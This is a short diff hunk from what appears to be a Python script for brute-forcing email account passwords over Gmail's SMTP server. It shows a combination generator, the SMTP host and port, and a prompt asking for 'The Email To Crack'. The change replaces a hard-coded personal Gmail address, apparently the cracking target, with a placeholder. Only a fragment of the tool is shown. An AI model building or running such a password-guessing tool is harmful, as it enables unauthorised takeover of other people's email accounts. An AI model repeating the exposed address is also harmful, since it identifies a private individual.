@@ -11,7 +11,7 @@ def generate_combinations(characters, string_length):
 generator = generate_combinations(characters, string_length)
 host = 'smtp.gmail.com'
 port = 587
-user = 'nagarajpalayam2@gmail.com'#input('[+] Enter The Email To Crack : ')
+user = 'YOURMAIL@gmail.com'#input('[+] Enter The Email To Crack : ')
    
 try:
     while True:
